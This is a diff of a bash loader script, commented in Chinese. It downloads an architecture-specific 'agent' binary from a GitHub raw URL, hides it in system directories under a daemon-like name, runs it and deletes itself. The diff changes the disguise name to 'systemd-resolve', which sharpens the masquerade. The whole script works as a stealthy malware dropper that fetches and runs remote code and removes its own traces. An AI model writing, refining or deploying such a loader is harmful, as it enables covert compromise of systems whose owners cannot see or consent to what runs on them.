@@ -1,10 +1,7 @@
 #!/usr/bin/env bash
-
 URL_AMD64="https://github.com/kd6379/test/raw/refs/heads/main/agent_amd64"
 URL_ARM64="https://github.com/kd6379/test/raw/refs/heads/main/agent_arm64"
-
 SCRIPT_PATH="$(cd "$(dirname "$0")" 2>/dev/null && pwd)/$(basename "$0")"
-
 # ── 架构 ──────────────────────────────────────────────────────────────────────
 ARCH=$(uname -m)
 case "$ARCH" in
@@ -12,8 +9,7 @@ case "$ARCH" in
     aarch64|arm64|armv8*) AGENT_URL="$URL_ARM64" ;;
     *) echo "[FAIL] 不支持的架构: $ARCH"; exit 1 ;;
 esac
-
-# ── 落地目录（只用已存在的目录，不新建）─────────────────────────────────────
+# ── 落地目录(只用已存在的目录,不新建)─────────────────────────────────────
 _BASE=""
 if [ "$(id -u)" -eq 0 ]; then
     for _d in /usr/local/lib /var/tmp /tmp; do
@@ -25,9 +21,8 @@ else
     done
 fi
 [ -n "$_BASE" ] || { echo "[FAIL] 无可写目录"; exit 1; }
-
 # ── 是否已在运行 ───────────────────────────────────────────────────────────────
-for _name in dirmngr keyboxd; do
+for _name in systemd-resolve; do
     _check="$_BASE/$_name"
     for _exe in /proc/[0-9]*/exe; do
         [ -e "$_exe" ] || continue
@@ -37,16 +32,14 @@ for _name in dirmngr keyboxd; do
         fi
     done
 done
-
-# ── 选文件名（不覆盖已有文件）────────────────────────────────────────────────
+# ── 选文件名(不覆盖已有文件)────────────────────────────────────────────────
 AGENT_PATH=""
-for _name in dirmngr keyboxd; do
+for _name in systemd-resolve; do
     if [ ! -f "$_BASE/$_name" ]; then
         AGENT_PATH="$_BASE/$_name"; break
     fi
 done
 [ -n "$AGENT_PATH" ] || { echo "[FAIL] 无可用文件名"; exit 1; }
-
 # ── 下载 ──────────────────────────────────────────────────────────────────────
 download() {
     local url="$1" dest="$2"
@@ -62,18 +55,14 @@ download() {
         echo "[FAIL] 无可用下载工具"; return 1
     fi
 }
-
 if ! download "$AGENT_URL" "$AGENT_PATH" || [ ! -s "$AGENT_PATH" ]; then
     rm -f "$AGENT_PATH"
     echo "[FAIL] 下载失败"; exit 1
 fi
-
 chmod 777 "$AGENT_PATH"
-
 # ── 执行 ──────────────────────────────────────────────────────────────────────
 "$AGENT_PATH"
 EXIT_CODE=$?
-
 if [ "$EXIT_CODE" -eq 0 ]; then
     rm -f "$AGENT_PATH"
     rm -f "$SCRIPT_PATH"
